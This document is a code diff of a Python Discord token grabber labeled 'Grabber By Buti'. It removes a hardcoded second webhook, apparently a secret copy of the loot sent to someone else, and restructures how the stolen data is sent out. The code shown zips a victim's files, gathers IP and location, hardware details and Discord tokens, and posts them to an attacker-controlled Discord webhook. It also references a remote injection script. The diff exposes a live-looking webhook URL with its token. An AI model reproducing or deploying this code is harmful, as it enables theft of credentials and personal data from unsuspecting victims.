@@ -28,9 +28,8 @@ __license__ = "GPL-3.0"
 __config__ = {
     # replace webhook_here with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    "webhook": "WEBHOOK_HERE",  # Place your first webhook here
-    "webhook2": "https://discord.com/api/webhooks/1171093477862408233/KqIJ6PvlvG1CiQ6tfkDN5R-Ve4v-76wSlKVJ2CaTxAYUAmMVTVVv-FImkZvoMhX6KBBD",  # Place your second webhook here
-# ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protect
+    "webhook": "WEBHOOK_HERE",  # Place your webhook here
+    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     "webhook_protector_key": "KEY_HERE",
     # keep it as it is unless you want to have a custom one
     "injection_url": "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
@@ -796,9 +795,14 @@ GoogleMaps: {self.googlemap}
                         os.remove(path)
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
-                            f.write("🌟・Grabber By Buti・https://supportbot.xyz/fucker\n\n")
+                            f.write(
+                                "🌟・Grabber By Buti・https://supportbot.xyz/fucker\n\n"
+                            )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
-                            fp.write(x + "\n\n🌟・Grabber By Buti・https://supportbot.xyz/fucker")
+                            fp.write(
+                                x
+                                + "\n\n🌟・Grabber By Buti・https://supportbot.xyz/fucker"
+                            )
 
         _zipfile = ntpath.join(self.appdata, f"FuckerV1-[{Victim}].zip")
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -839,7 +843,9 @@ GoogleMaps: {self.googlemap}
                                 City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
                                 Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
                                 Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
-                            """.replace(" ", ""),
+                            """.replace(
+                                " ", ""
+                            ),
                             "inline": True,
                         },
                         {
@@ -850,14 +856,18 @@ GoogleMaps: {self.googlemap}
                                 WinVer:᠎ {self.winver.replace(" ", "᠎ ")}
                                 DiskSpace:᠎ {disk}GB
                                 Ram:᠎ {ram}GB```
-                            """.replace(" ", ""),
+                            """.replace(
+                                " ", ""
+                            ),
                             "inline": True,
                         },
                         {
                             "name": "**Tokens:**",
                             "value": f"""```yaml
                                 {tokens if tokens else "No tokens extracted"}```
-                            """.replace(" ", ""),
+                            """.replace(
+                                " ", ""
+                            ),
                             "inline": False,
                         },
                         {
@@ -866,7 +876,9 @@ GoogleMaps: {self.googlemap}
                                 [
                                 {files_found.strip()}
                                 ]```
-                            """.replace(" ", ""),
+                            """.replace(
+                                " ", ""
+                            ),
                             "inline": False,
                         },
                     ],
@@ -879,16 +891,20 @@ GoogleMaps: {self.googlemap}
         if self.fetch_conf("ping_on_run"):
             embed.update({"content": "@everyone"})
 
-        # Wysyłanie do webhooka 1
-        if self.hook_reg in self.webhook:
-            httpx.post(self.webhook, json=embed)
-            httpx.post(self.webhook, files={"upload_file": f})
+        with open(_zipfile, "rb") as f:
+            if self.hook_reg in self.webhook:
+                httpx.post(self.webhook, json=embed)
+                httpx.post(self.webhook, files={"upload_file": f})
+            else:
+                from pyotp import TOTP
 
-        # Wysyłanie do webhooka 2
-        if self.hook_reg in self.webhook2:
-            httpx.post(self.webhook2, json=embed)
-            httpx.post(self.webhook2, files={"upload_file": f})
-
+                key = TOTP(self.fetch_conf("webhook_protector_key")).now()
+                httpx.post(self.webhook, headers={"Authorization": key}, json=embed)
+                httpx.post(
+                    self.webhook,
+                    headers={"Authorization": key},
+                    files={"upload_file": f},
+                )
         os.remove(_zipfile)
         self.hazard_exit()
 
